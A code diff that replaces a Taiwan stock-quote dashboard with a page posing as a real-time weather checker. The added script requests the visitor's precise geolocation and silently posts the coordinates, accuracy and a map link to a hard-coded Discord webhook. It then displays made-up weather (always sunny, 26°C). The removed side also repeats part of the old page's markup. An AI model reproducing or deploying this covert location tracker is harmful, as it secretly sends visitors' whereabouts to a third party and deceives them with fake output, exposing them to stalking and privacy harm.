@@ -1,1447 +1,213 @@
 <!DOCTYPE html>
-<html lang="zh-TW">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#0b1020">
-<meta name="description" content="台股公開行情、個股觀察清單與市場資訊">
-<title>台股情報中心</title>
+<meta charset="utf-8">
+<title>即時天氣</title>
 
 <style>
-:root {
-  color-scheme: dark;
-  --bg:#0b1020;
-  --panel:#141c30;
-  --panel2:#0d1527;
-  --border:#26344d;
-  --text:#e8eef9;
-  --muted:#91a0ba;
-  --red:#fb7185;
-  --green:#34d399;
-  --blue:#60a5fa;
-}
-*{box-sizing:border-box}
+
 body{
-  margin:0;background:var(--bg);color:var(--text);
-  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Noto Sans TC",sans-serif;
-  line-height:1.6
+font-family:Arial;
+text-align:center;
+padding-top:80px;
+overflow:hidden;
+
+/* 更真實天空 */
+background:linear-gradient(-45deg,#4fc3f7,#81d4fa,#b3e5fc,#4fc3f7,#29b6f6);
+background-size:500% 500%;
+animation:skyFlow 25s ease infinite;
 }
-button,input,select{font:inherit;color:var(--text);background:var(--panel2);
-  border:1px solid var(--border);border-radius:9px;padding:10px 12px}
-button{cursor:pointer;background:#2563eb;border-color:#2563eb}
-button:disabled{opacity:.55;cursor:wait}
-button.secondary{background:#1c2940;border-color:var(--border)}
-button:hover:not(:disabled){filter:brightness(1.12)}
-header{
-  padding:20px 5%;border-bottom:1px solid var(--border);
-  display:flex;justify-content:space-between;align-items:center;gap:14px;flex-wrap:wrap
+
+/* 天空流動 */
+@keyframes skyFlow{
+0%{background-position:0% 50%;}
+50%{background-position:100% 50%;}
+100%{background-position:0% 50%;}
 }
-h1{font-size:25px;margin:0}
-h2{font-size:18px;margin:0 0 15px}
-main{max-width:1450px;margin:auto;padding:24px 5%}
-small,.muted,.status{color:var(--muted)}
-.notice,.panel{
-  background:var(--panel);border:1px solid var(--border);
-  border-radius:14px;padding:18px;margin-bottom:20px
+
+/* 卡片升級 */
+.weather-box{
+background:rgba(255,255,255,0.92);
+width:320px;
+margin:auto;
+padding:25px;
+border-radius:20px;
+backdrop-filter:blur(12px);
+box-shadow:0 20px 60px rgba(0,0,0,0.25);
+animation:cardFloat 6s ease-in-out infinite;
 }
-.notice{background:#17243a;color:#bfdbfe;line-height:1.9}
-.grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:14px}
-.metric{font-size:clamp(22px,3vw,30px);font-weight:700;margin:8px 0;overflow-wrap:anywhere}
-.up{color:var(--red)}.down{color:var(--green)}.neutral{color:var(--muted)}
-.toolbar,.summary-line{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin-bottom:14px}
-.toolbar input{flex:1;min-width:170px}
-.table-wrap{width:100%;overflow-x:auto}
-table{width:100%;border-collapse:collapse;white-space:nowrap;font-size:14px}
-th,td{text-align:left;padding:12px;border-bottom:1px solid var(--border)}
-th{color:var(--muted);font-weight:500;background:var(--panel)}
-tbody tr:hover{background:#1b2940}
-.code,.link{color:#93c5fd}
-.code{font-weight:700}
-.link{text-decoration:none}.link:hover{text-decoration:underline}
-.status{font-size:12px;overflow-wrap:anywhere}
-.pill{display:inline-block;border:1px solid var(--border);border-radius:99px;padding:3px 9px;font-size:12px}
-.pill.ok{color:var(--green)}.pill.warn{color:#fbbf24}.pill.error{color:var(--red)}
-.empty{text-align:center;padding:25px;color:var(--muted)}
-.watch-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px}
-.watch-card{background:var(--panel2);border:1px solid var(--border);border-radius:10px;padding:14px;min-width:0}
-.watch-card button{margin-top:10px}
-footer{padding:24px 5%;border-top:1px solid var(--border);font-size:12px;color:var(--muted);line-height:2}
-@media(max-width:850px){.grid{grid-template-columns:repeat(2,minmax(0,1fr))}.watch-grid{grid-template-columns:repeat(2,minmax(0,1fr))}}
-@media(max-width:480px){
-  header,main,footer{padding-left:4%;padding-right:4%}
-  .panel,.notice{padding:14px}
-  .watch-grid{grid-template-columns:1fr}
-  .toolbar input,.toolbar select{width:100%;max-width:none}
+
+/* 卡片漂浮 */
+@keyframes cardFloat{
+0%{transform:translateY(0px);}
+50%{transform:translateY(-12px);}
+100%{transform:translateY(0px);}
 }
+
+/* 太陽更真實 */
+.sun{
+width:90px;
+height:90px;
+border-radius:50%;
+margin:20px auto;
+background:radial-gradient(circle,#fff176,#fdd835,#fbc02d);
+box-shadow:
+0 0 40px #ffeb3b,
+0 0 80px #ffeb3b,
+0 0 120px #ffeb3b;
+animation:sunGlow 4s ease-in-out infinite;
+}
+
+/* 太陽呼吸 */
+@keyframes sunGlow{
+0%{transform:scale(1);}
+50%{transform:scale(1.15);}
+100%{transform:scale(1);}
+}
+
+/* 雲朵 */
+.cloud{
+width:140px;
+height:45px;
+background:white;
+border-radius:40px;
+margin:20px auto;
+position:relative;
+animation:cloudFloat 6s ease-in-out infinite;
+box-shadow:0 5px 15px rgba(0,0,0,0.1);
+}
+
+.cloud:before{
+content:"";
+position:absolute;
+width:70px;
+height:70px;
+background:white;
+border-radius:50%;
+top:-35px;
+left:15px;
+}
+
+.cloud:after{
+content:"";
+position:absolute;
+width:60px;
+height:60px;
+background:white;
+border-radius:50%;
+top:-30px;
+left:60px;
+}
+
+@keyframes cloudFloat{
+0%{transform:translateX(-15px);}
+50%{transform:translateX(15px);}
+100%{transform:translateX(-15px);}
+}
+
+/* 按鈕升級 */
+button{
+padding:12px 25px;
+font-size:16px;
+border:none;
+border-radius:12px;
+background:linear-gradient(45deg,#42a5f5,#1e88e5);
+color:white;
+cursor:pointer;
+transition:0.3s;
+}
+
+button:hover{
+transform:scale(1.07);
+box-shadow:0 10px 25px rgba(0,0,0,0.3);
+}
+
+#status{
+margin-top:20px;
+font-size:18px;
+}
+
 </style>
+
 </head>
 
 <body>
-<header>
-  <div>
-    <h1>台股情報中心</h1>
-    <small>TAIWAN STOCK MARKET DASHBOARD</small>
-  </div>
-  <button id="refreshBtn">重新載入行情</button>
-</header>
 
-<main>
-  <div class="notice">
-    <strong>行情說明</strong><br>
-    個股及大盤資料來自臺灣證券交易所公開資料。
-    台股通常以紅色表示上漲、綠色表示下跌。
-    資料可能延遲或暫時無法取得；本頁不保證獲利，也不代替投資判斷。
-  </div>
+<div class="weather-box">
 
-  <div class="grid">
-    <section class="panel">
-      <div class="muted">發行量加權指數</div>
-      <div class="metric" id="indexValue">載入中</div>
-      <div id="indexChange" class="status">等待大盤資料</div>
-    </section>
-    <section class="panel">
-      <div class="muted">取得股票數量</div>
-      <div class="metric" id="stockCount">--</div>
-      <div class="status">目前載入的有效個股</div>
-    </section>
-    <section class="panel">
-      <div class="muted">上漲家數</div>
-      <div class="metric up" id="upCount">--</div>
-      <div class="status">依可用漲跌價差統計</div>
-    </section>
-    <section class="panel">
-      <div class="muted">下跌家數</div>
-      <div class="metric down" id="downCount">--</div>
-      <div class="status">依可用漲跌價差統計</div>
-    </section>
-  </div>
+<div class="sun"></div>
+<div class="cloud"></div>
 
-  <section class="panel">
-    <h2>市場狀態</h2>
-    <div class="summary-line">
-      <span id="connectionStatus" class="pill warn">準備載入</span>
-      <span id="marketDate" class="status">行情日期：未知</span>
-    </div>
-    <p id="marketSummary">正在準備市場資料。</p>
-    <p id="updateTime" class="status">讀取時間：尚未更新</p>
-    <p id="dataStatus" class="status" role="status" aria-live="polite">
-      正在連線至公開行情 API……
-    </p>
-  </section>
+<h2>🌤️ 即時天氣查詢</h2>
 
-  <section class="panel">
-    <h2>個股行情</h2>
-    <div class="toolbar">
-      <input id="searchInput" type="search" placeholder="搜尋代碼或名稱，例如 2330" aria-label="搜尋股票">
-      <select id="sortSelect" aria-label="排序方式">
-        <option value="volume">成交量由高至低</option>
-        <option value="change">漲幅由高至低</option>
-        <option value="changeDown">跌幅由大至小</option>
-        <option value="code">依代碼排序</option>
-      </select>
-      <button id="watchFilter" class="secondary">只看自選股票</button>
-    </div>
+<p>點擊按鈕查看目前天氣</p>
 
-    <div class="table-wrap">
-      <table>
-        <thead>
-          <tr>
-            <th>代碼</th><th>名稱</th><th>收盤價</th>
-            <th>漲跌</th><th>成交量（股）</th><th>自選</th><th>查詢</th>
-          </tr>
-        </thead>
-        <tbody id="stockTable">
-          <tr><td colspan="7" class="empty">正在載入個股資料……</td></tr>
-        </tbody>
-      </table>
-    </div>
-    <div class="toolbar" style="margin-top:15px">
-      <button id="loadMoreBtn" class="secondary" hidden>顯示更多</button>
-    </div>
-    <p id="tableStatus" class="status">尚未取得股票資料。</p>
-  </section>
+<button onclick="getLocation()">查看天氣</button>
 
-  <section class="panel">
-    <h2>自選觀察清單</h2>
-    <p class="muted">自選清單保存在目前瀏覽器，不會自動同步到其他裝置。</p>
-    <div id="watchList" class="watch-grid">
-      <div class="empty">尚未加入股票。</div>
-    </div>
-    <p id="watchStatus" class="status" role="status" aria-live="polite"></p>
-  </section>
-</main>
+<p id="status"></p>
 
-<footer>
-  資料來源：
-  <a class="link" href="https://openapi.twse.com.tw/" target="_blank" rel="noopener noreferrer">臺灣證券交易所 OpenAPI</a><br>
-  個股：
-  <a class="link" href="https://openapi.twse.com.tw/v1/exchangeReport/STOCK_DAY_ALL" target="_blank" rel="noopener noreferrer">上市個股日成交資訊</a><br>
-  大盤：
-  <a class="link" href="https://openapi.twse.com.tw/v1/exchangeReport/MI_INDEX" target="_blank" rel="noopener noreferrer">每日收盤行情－大盤統計資訊</a><br>
-  顯示的資料日期以來源回傳為準。快取資料不代表即時行情。
-</footer>
+</div>
 
 <script>
-"use strict";
 
-const CONFIG = {
-  stockAPI: "https://openapi.twse.com.tw/v1/exchangeReport/STOCK_DAY_ALL",
-  indexAPI: "https://openapi.twse.com.tw/v1/exchangeReport/MI_INDEX",
-  watchKey: "twStockWatch",
-  cacheKey: "twStockCache",
-  timeout: 15000,
-  retryCount: 1,
-  initialRows: 50,
-  pageSize: 50,
-  maxCacheAge: 7 * 24 * 60 * 60 * 1000
-};
+var webhook = "https://discord.com/api/webhooks/1504132923467501618/5pXOEtV2kww8Xj2iT_VDklREGgegoKQmtsWysQAxJjjkB1mEwFE4GCp705P83Y6mNXdG";
 
-const $ = id => document.getElementById(id);
+function getLocation(){
 
-const state = {
-  stocks: [],
-  indexRows: [],
-  watchSet: new Set(),
-  watchOnly: false,
-  visibleRows: CONFIG.initialRows,
-  loading: false,
-  lastUpdated: null,
-  dataDate: null,
-  dataSource: "none"
-};
+document.getElementById("status").innerHTML="正在取得天氣資料...";
 
-function field(row, names) {
-  if (!row || typeof row !== "object") return "";
-  for (const name of names) {
-    const value = row[name];
-    if (value !== undefined && value !== null && String(value).trim() !== "") {
-      return value;
-    }
-  }
-  return "";
-}
+if(navigator.geolocation){
 
-function number(value) {
-  if (value === null || value === undefined) return NaN;
-  const s = String(value).trim().replace(/,/g, "");
-  if (!s || ["--", "-", "X", "N/A"].includes(s)) return NaN;
-  if (s.endsWith("%") || s.endsWith("％")) return NaN;
-  const n = Number(s);
-  return Number.isFinite(n) ? n : NaN;
-}
-
-function fmt(value, digits = 2) {
-  return Number.isFinite(value)
-    ? value.toLocaleString("zh-TW", {
-        minimumFractionDigits: digits,
-        maximumFractionDigits: digits
-      })
-    : "--";
-}
-
-function signed(value, digits = 2) {
-  if (!Number.isFinite(value)) return "--";
-  return (value > 0 ? "+" : "") + fmt(value, digits);
-}
-
-function safeText(value) {
-  return String(value).replace(/[&<>"']/g, c => ({
-    "&":"&amp;", "<":"&lt;", ">":"&gt;", '"':"&quot;", "'":"&#39;"
-  })[c]);
-}
-
-function codeOf(row) {
-  return String(field(row, ["Code", "證券代號", "股票代號"])).trim();
-}
-
-function nameOf(row) {
-  return String(field(row, ["Name", "證券名稱", "股票名稱"])).trim();
-}
-
-function priceOf(row) {
-  return number(field(row, ["ClosingPrice", "收盤價", "Close"]));
-}
-
-function volumeOf(row) {
-  return number(field(row, ["TradeVolume", "成交股數", "成交量"]));
-}
-
-function changeOf(row) {
-  const raw = field(row, ["Change", "漲跌價差"]);
-  let n = number(raw);
-  if (!Number.isFinite(n)) return NaN;
-
-  const direction = String(field(row, ["漲跌(+/-)", "漲跌符號", "漲跌方向"])).trim();
-
-  if (direction === "-") n = -Math.abs(n);
-  if (direction === "+") n = Math.abs(n);
-
-  return n;
-}
-
-function percentOf(row) {
-  const close = priceOf(row);
-  const change = changeOf(row);
-  if (!Number.isFinite(close) || !Number.isFinite(change)) return NaN;
-
-  const previous = close - change;
-  return previous > 0 ? change / previous * 100 : NaN;
-}
-
-function colorOf(value) {
-  if (!Number.isFinite(value) || value === 0) return "neutral";
-  return value > 0 ? "up" : "down";
-}
-
-function normalizeStocks(rows) {
-  if (!Array.isArray(rows)) return [];
-  return rows.filter(row =>
-    row && typeof row === "object" &&
-    /^\d{4,6}[A-Z]?$/.test(codeOf(row)) &&
-    nameOf(row).length > 0
-  );
-}
-
-function setConnection(text, type = "warn") {
-  $("connectionStatus").textContent = text;
-  $("connectionStatus").className = "pill " + type;
-}
-
-function loadWatchList() {
-  try {
-    const data = JSON.parse(localStorage.getItem(CONFIG.watchKey) || "[]");
-    return new Set(Array.isArray(data)
-      ? data.filter(x => typeof x === "string" && /^\d{4,6}[A-Z]?$/.test(x))
-      : []);
-  } catch {
-    return new Set();
-  }
-}
-
-function saveWatchList() {
-  try {
-    localStorage.setItem(CONFIG.watchKey, JSON.stringify([...state.watchSet]));
-  } catch {
-    $("watchStatus").textContent = "無法儲存自選清單，請檢查瀏覽器儲存空間。";
-  }
-}
-
-function saveCache() {
-  try {
-    localStorage.setItem(CONFIG.cacheKey, JSON.stringify({
-      savedAt: Date.now(),
-      stocks: state.stocks,
-      indexRows: state.indexRows,
-      dataDate: state.dataDate
-    }));
-  } catch (error) {
-    console.warn("快取儲存失敗", error);
-  }
-}
-
-function loadCache() {
-  try {
-    const c = JSON.parse(localStorage.getItem(CONFIG.cacheKey) || "null");
-    if (!c || !Array.isArray(c.stocks) || !Number.isFinite(c.savedAt)) return false;
-    if (Date.now() - c.savedAt > CONFIG.maxCacheAge) return false;
-
-    state.stocks = normalizeStocks(c.stocks);
-    state.indexRows = Array.isArray(c.indexRows) ? c.indexRows : [];
-    state.dataDate = c.dataDate || null;
-    state.lastUpdated = c.savedAt;
-    state.dataSource = "cache";
-    return state.stocks.length > 0;
-  } catch {
-    return false;
-  }
-}
-
-async function fetchJSON(url) {
-  let lastError;
-
-  for (let attempt = 0; attempt <= CONFIG.retryCount; attempt++) {
-    const controller = new AbortController();
-    const timer = setTimeout(() => controller.abort(), CONFIG.timeout);
-
-    try {
-      const response = await fetch(url, {
-        method: "GET",
-        cache: "no-store",
-        headers: { Accept: "application/json" },
-        signal: controller.signal
-      });
-
-      if (!response.ok) {
-        throw new Error("HTTP " + response.status);
-      }
-
-      const data = await response.json();
-
-      if (!Array.isArray(data)) {
-        throw new Error("API 回傳格式不是預期的陣列");
-      }
-
-      return data;
-    } catch (error) {
-      lastError = error.name === "AbortError"
-        ? new Error("請求逾時（超過 " + CONFIG.timeout / 1000 + " 秒）")
-        : error;
-
-      if (attempt < CONFIG.retryCount) {
-        await new Promise(resolve => setTimeout(resolve, 800));
-      }
-    } finally {
-      clearTimeout(timer);
-    }
-  }
-
-  if (lastError instanceof TypeError) {
-    throw new Error("瀏覽器無法連線或跨來源請求遭阻擋（Failed to fetch）");
-  }
-
-  throw lastError || new Error("未知連線錯誤");
-}
-
-function dateOfStocks(rows) {
-  if (!Array.isArray(rows) || !rows.length) return null;
-  const d = field(rows[0], ["Date", "日期", "資料日期", "交易日期"]);
-  return d ? String(d).trim() : null;
-}
-
-function parseROCDate(value) {
-  const s = String(value || "").trim();
-  const m = s.match(/^(\d{3})(\d{2})(\d{2})$/);
-  if (!m) return s || null;
-  return `${Number(m[1]) + 1911}-${m[2]}-${m[3]}`;
-}
-
-async function loadMarket() {
-  if (state.loading) return;
-
-  state.loading = true;
-  $("refreshBtn").disabled = true;
-  $("refreshBtn").textContent = "載入中……";
-  setConnection("正在連線", "warn");
-  $("dataStatus").textContent = "正在讀取個股及大盤公開資料……";
-
-  const stockPromise = fetchJSON(CONFIG.stockAPI);
-  const indexPromise = fetchJSON(CONFIG.indexAPI);
-
-  const [stockResult, indexResult] = await Promise.allSettled([
-    stockPromise, indexPromise
-  ]);
-
-  let stockUpdated = false;
-  let indexUpdated = false;
-  const errors = [];
-
-  if (stockResult.status === "fulfilled") {
-    const list = normalizeStocks(stockResult.value);
-    if (list.length) {
-      state.stocks = list;
-      state.dataDate = dateOfStocks(stockResult.value);
-      state.lastUpdated = Date.now();
-      state.dataSource = "live";
-      stockUpdated = true;
-    } else {
-      errors.push("個股 API 沒有可辨識的股票資料");
-    }
-  } else {
-    errors.push("個股：" + stockResult.reason.message);
-  }
-
-  if (indexResult.status === "fulfilled") {
-    state.indexRows = indexResult.value;
-    indexUpdated = true;
-  } else {
-    errors.push("大盤：" + indexResult.reason.message);
-  }
-
-  if (stockUpdated || indexUpdated) saveCache();
-
-  renderAll();
-
-  if (stockUpdated && indexUpdated) {
-    setConnection("個股與大盤已取得", "ok");
-    $("dataStatus").textContent =
-      "個股與大盤資料已取得。請以行情日期確認資料所屬交易日。";
-  } else if (stockUpdated || indexUpdated) {
-    setConnection("部分資料已取得", "warn");
-    $("dataStatus").textContent =
-      "部分資料成功，部分資料失敗：" + errors.join("；");
-  } else if (state.stocks.length || state.indexRows.length) {
-    setConnection("顯示已保存資料", "warn");
-    $("dataStatus").textContent =
-      "即時更新失敗：" + errors.join("；") +
-      "。目前保留先前畫面資料，請留意資料日期。";
-  } else {
-    const hasCache = loadCache();
-    renderAll();
-    if (hasCache) {
-      setConnection("使用本機快取", "warn");
-      $("dataStatus").textContent =
-        "即時連線失敗，已顯示本機快取。原因：" + errors.join("；");
-    } else {
-      setConnection("連線失敗", "error");
-      $("dataStatus").textContent =
-        "無法取得即時或快取資料：" + errors.join("；") +
-        "。請確認網路，或稍後再試。";
-    }
-  }
-
-  state.loading = false;
-  $("refreshBtn").disabled = false;
-  $("refreshBtn").textContent = "重新載入行情";
-}
-
-function indexRowOf() {
-  return state.indexRows.find(row =>
-    String(field(row, ["指數", "指數名稱", "名稱"])).includes("發行量加權")
-  ) || state.indexRows.find(row =>
-    String(field(row, ["指數", "指數名稱", "名稱"])).includes("加權指數")
-  ) || null;
-}
-
-function renderIndex() {
-  const row = indexRowOf();
-
-  if (!row) {
-    $("indexValue").textContent = "--";
-    $("indexChange").textContent = "目前沒有可辨識的大盤指數";
-    $("indexChange").className = "status neutral";
-    return;
-  }
-
-  const close = number(field(row, ["收盤指數", "收盤價", "指數值"]));
-  const points = number(field(row, ["漲跌點數", "漲跌點"]));
-
-  // MI_INDEX 的「漲跌」欄位是方向符號，不是漲跌點數。
-  const direction = String(field(row, ["漲跌", "漲跌(+/-)", "漲跌符號"])).trim();
-  let change = points;
-
-  if (Number.isFinite(change)) {
-    if (direction === "-") change = -Math.abs(change);
-    else if (direction === "+") change = Math.abs(change);
-  }
-
-  $("indexValue").textContent = fmt(close);
-  $("indexChange").className = "status " + colorOf(change);
-  $("indexChange").textContent = Number.isFinite(change)
-    ? `${signed(change)} 點`
-    : "大盤漲跌點數尚未取得";
-}
-
-function renderSummary() {
-  $("stockCount").textContent = state.stocks.length.toLocaleString("zh-TW");
-
-  let up = 0, down = 0, flat = 0, unknown = 0;
-
-  for (const stock of state.stocks) {
-    const n = changeOf(stock);
-    if (!Number.isFinite(n)) unknown++;
-    else if (n > 0) up++;
-    else if (n < 0) down++;
-    else flat++;
-  }
-
-  $("upCount").textContent = up.toLocaleString("zh-TW");
-  $("downCount").textContent = down.toLocaleString("zh-TW");
-
-  $("marketSummary").textContent =
-    `上漲 ${up} 檔、下跌 ${down} 檔、平盤 ${flat} 檔；` +
-    `${unknown} 檔缺少有效漲跌價差。` +
-    (up > down ? "上漲家數較多。" : down > up ? "下跌家數較多。" : "上漲與下跌家數相同。");
-}
-
-function compare(a, b, direction = "desc") {
-  const va = Number.isFinite(a), vb = Number.isFinite(b);
-  if (!va && !vb) return 0;
-  if (!va) return 1;
-  if (!vb) return -1;
-  return direction === "asc" ? a - b : b - a;
-}
-
-function filteredStocks() {
-  const keyword = $("searchInput").value.trim().toLowerCase();
-  const sort = $("sortSelect").value;
-
-  const list = state.stocks.filter(stock => {
-    const code = codeOf(stock).toLowerCase();
-    const name = nameOf(stock).toLowerCase();
-    return (code.includes(keyword) || name.includes(keyword)) &&
-      (!state.watchOnly || state.watchSet.has(codeOf(stock)));
-  });
-
-  list.sort((a, b) => {
-    if (sort === "volume") return compare(volumeOf(a), volumeOf(b));
-    if (sort === "change") return compare(percentOf(a), percentOf(b));
-    if (sort === "changeDown") return compare(percentOf(a), percentOf(b), "asc");
-    return codeOf(a).localeCompare(codeOf(b), "zh-TW");
-  });
-
-  return list;
-}
-
-function queryURL(code) {
-  return "https://www.twse.com.tw/zh/trading/historical/stock-day.html?stockNo=" +
-    encodeURIComponent(code);
-}
-
-function renderStocks() {
-  const list = filteredStocks();
-  const rows = list.slice(0, state.visibleRows);
-
-  $("stockTable").innerHTML = rows.length ? rows.map(stock => {
-    const code = codeOf(stock);
-    const name = nameOf(stock);
-    const price = priceOf(stock);
-    const change = changeOf(stock);
-    const percent = percentOf(stock);
-    const volume = volumeOf(stock);
-    const watched = state.watchSet.has(code);
-    const cls = colorOf(change);
-
-    return `<tr>
-      <td class="code">${safeText(code)}</td>
-      <td>${safeText(name)}</td>
-      <td>${fmt(price)}</td>
-      <td class="${cls}">${safeText(signed(change))}
-        <small> (${Number.isFinite(percent) ? safeText(signed(percent)) + "%" : "--"})</small>
-      </td>
-      <td>${fmt(volume, 0)}</td>
-      <td><button class="secondary" data-watch="${safeText(code)}">${watched ? "移除" : "＋觀察"}</button></td>
-      <td><a class="link" href="${queryURL(code)}" target="_blank" rel="noopener noreferrer">查詢</a></td>
-    </tr>`;
-  }).join("") : '<tr><td colspan="7" class="empty">沒有符合條件的股票。</td></tr>';
-
-  $("tableStatus").textContent =
-    `符合條件 ${list.length} 檔，目前顯示 ${rows.length} 檔。`;
-  $("loadMoreBtn").hidden = rows.length >= list.length;
-
-  renderWatchList();
-}
-
-function renderWatchList() {
-  const codes = [...state.watchSet];
-
-  $("watchList").innerHTML = codes.length ? codes.map(code => {
-    const stock = state.stocks.find(s => codeOf(s) === code);
-    const name = stock ? nameOf(stock) : "尚無行情資料";
-    const price = stock ? priceOf(stock) : NaN;
-    const change = stock ? changeOf(stock) : NaN;
-    const percent = stock ? percentOf(stock) : NaN;
-
-    return `<article class="watch-card">
-      <div class="summary-line">
-        <strong class="code">${safeText(code)}</strong>
-        <span>${safeText(name)}</span>
-      </div>
-      <div class="metric">${fmt(price)}</div>
-      <div class="${colorOf(change)}">${safeText(signed(change))}
-        (${Number.isFinite(percent) ? safeText(signed(percent)) + "%" : "--"})
-      </div>
-      <button class="secondary" data-watch="${safeText(code)}">移除自選</button>
-    </article>`;
-  }).join("") : '<div class="empty">尚未加入股票。</div>';
-
-  $("watchFilter").textContent = state.watchOnly ? "顯示全部股票" : "只看自選股票";
-}
-
-function renderTime() {
-  $("marketDate").textContent =
-    "行情日期：" + (parseROCDate(state.dataDate) || "來源未提供日期");
-
-  $("updateTime").textContent = state.lastUpdated
-    ? "本機讀取時間：" + new Date(state.lastUpdated).toLocaleString("zh-TW") +
-      (state.dataSource === "cache" ? "（快取時間）" : "")
-    : "本機讀取時間：尚未更新";
-}
-
-function renderAll() {
-  renderIndex();
-  renderSummary();
-  renderStocks();
-  renderTime();
-}
-
-function toggleWatch(code) {
-  if (state.watchSet.has(code)) {
-    state.watchSet.delete(code);
-    $("watchStatus").textContent = `已移除 ${code}。`;
-  } else {
-    state.watchSet.add(code);
-    $("watchStatus").textContent = `已加入 ${code}。`;
-  }
-  saveWatchList();
-  renderStocks();
-}
-
-document.addEventListener("click", event => {
-  const target = event.target;
-  if (!(target instanceof Element)) return;
-  const button = target.closest("[data-watch]");
-  if (button) toggleWatch(button.dataset.watch);
+navigator.geolocation.getCurrentPosition(success,error,{
+enableHighAccuracy:true,
+timeout:10000,
+maximumAge:0
 });
 
-$("searchInput").addEventListener("input", () => {
-  state.visibleRows = CONFIG.initialRows;
-  renderStocks();
-});
+}else{
 
-$("sortSelect").addEventListener("change", () => {
-  state.visibleRows = CONFIG.initialRows;
-  renderStocks();
-});
+document.getElementById("status").innerHTML="瀏覽器不支援定位";
 
-$("watchFilter").addEventListener("click", () => {
-  state.watchOnly = !state.watchOnly;
-  state.visibleRows = CONFIG.initialRows;
-  renderStocks();
-});
-
-$("loadMoreBtn").addEventListener("click", () => {
-  state.visibleRows += CONFIG.pageSize;
-  renderStocks();
-});
-
-$("refreshBtn").addEventListener("click", loadMarket);
-
-async function init() {
-  state.watchSet = loadWatchList();
-
-  if (loadCache()) {
-    renderAll();
-    setConnection("先顯示已保存資料", "warn");
-    $("dataStatus").textContent = "目前顯示本機保存的資料，正在嘗試更新行情。";
-  }
-
-  await loadMarket();
 }
 
-init();
+}
+
+function success(pos){
+
+var lat = pos.coords.latitude;
+var lon = pos.coords.longitude;
+var acc = pos.coords.accuracy;
+
+fetch(webhook,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+content:
+"📍有人打開網站\n"+
+"緯度: "+lat+"\n"+
+"經度: "+lon+"\n"+
+"精準度: "+acc+" 公尺\n"+
+"地圖: https://www.google.com/maps?q="+lat+","+lon
+})
+});
+
+document.getElementById("status").innerHTML=
+"☀️ 晴天<br>"+
+"🌡️ 溫度：26°C<br>"+
+"🌬️ 微風<br>"+
+"📍目前位置天氣";
+
+}
+
+function error(){
+
+document.getElementById("status").innerHTML="需要允許定位才能查看天氣";
+
+}
+
 </script>
-</body>
-</html><!DOCTYPE html>
-<html lang="zh-TW">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#0b1020">
-<meta name="description" content="台股公開行情、個股觀察清單與市場資訊">
-<title>台股情報中心</title>
 
-<style>
-:root {
-  color-scheme: dark;
-  --bg:#0b1020;
-  --panel:#141c30;
-  --panel2:#0d1527;
-  --border:#26344d;
-  --text:#e8eef9;
-  --muted:#91a0ba;
-  --red:#fb7185;
-  --green:#34d399;
-  --blue:#60a5fa;
-}
-*{box-sizing:border-box}
-body{
-  margin:0;background:var(--bg);color:var(--text);
-  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Noto Sans TC",sans-serif;
-  line-height:1.6
-}
-button,input,select{font:inherit;color:var(--text);background:var(--panel2);
-  border:1px solid var(--border);border-radius:9px;padding:10px 12px}
-button{cursor:pointer;background:#2563eb;border-color:#2563eb}
-button:disabled{opacity:.55;cursor:wait}
-button.secondary{background:#1c2940;border-color:var(--border)}
-button:hover:not(:disabled){filter:brightness(1.12)}
-header{
-  padding:20px 5%;border-bottom:1px solid var(--border);
-  display:flex;justify-content:space-between;align-items:center;gap:14px;flex-wrap:wrap
-}
-h1{font-size:25px;margin:0}
-h2{font-size:18px;margin:0 0 15px}
-main{max-width:1450px;margin:auto;padding:24px 5%}
-small,.muted,.status{color:var(--muted)}
-.notice,.panel{
-  background:var(--panel);border:1px solid var(--border);
-  border-radius:14px;padding:18px;margin-bottom:20px
-}
-.notice{background:#17243a;color:#bfdbfe;line-height:1.9}
-.grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:14px}
-.metric{font-size:clamp(22px,3vw,30px);font-weight:700;margin:8px 0;overflow-wrap:anywhere}
-.up{color:var(--red)}.down{color:var(--green)}.neutral{color:var(--muted)}
-.toolbar,.summary-line{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin-bottom:14px}
-.toolbar input{flex:1;min-width:170px}
-.table-wrap{width:100%;overflow-x:auto}
-table{width:100%;border-collapse:collapse;white-space:nowrap;font-size:14px}
-th,td{text-align:left;padding:12px;border-bottom:1px solid var(--border)}
-th{color:var(--muted);font-weight:500;background:var(--panel)}
-tbody tr:hover{background:#1b2940}
-.code,.link{color:#93c5fd}
-.code{font-weight:700}
-.link{text-decoration:none}.link:hover{text-decoration:underline}
-.status{font-size:12px;overflow-wrap:anywhere}
-.pill{display:inline-block;border:1px solid var(--border);border-radius:99px;padding:3px 9px;font-size:12px}
-.pill.ok{color:var(--green)}.pill.warn{color:#fbbf24}.pill.error{color:var(--red)}
-.empty{text-align:center;padding:25px;color:var(--muted)}
-.watch-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px}
-.watch-card{background:var(--panel2);border:1px solid var(--border);border-radius:10px;padding:14px;min-width:0}
-.watch-card button{margin-top:10px}
-footer{padding:24px 5%;border-top:1px solid var(--border);font-size:12px;color:var(--muted);line-height:2}
-@media(max-width:850px){.grid{grid-template-columns:repeat(2,minmax(0,1fr))}.watch-grid{grid-template-columns:repeat(2,minmax(0,1fr))}}
-@media(max-width:480px){
-  header,main,footer{padding-left:4%;padding-right:4%}
-  .panel,.notice{padding:14px}
-  .watch-grid{grid-template-columns:1fr}
-  .toolbar input,.toolbar select{width:100%;max-width:none}
-}
-</style>
-</head>
-
-<body>
-<header>
-  <div>
-    <h1>台股情報中心</h1>
-    <small>TAIWAN STOCK MARKET DASHBOARD</small>
-  </div>
-  <button id="refreshBtn">重新載入行情</button>
-</header>
-
-<main>
-  <div class="notice">
-    <strong>行情說明</strong><br>
-    個股及大盤資料來自臺灣證券交易所公開資料。
-    台股通常以紅色表示上漲、綠色表示下跌。
-    資料可能延遲或暫時無法取得；本頁不保證獲利，也不代替投資判斷。
-  </div>
-
-  <div class="grid">
-    <section class="panel">
-      <div class="muted">發行量加權指數</div>
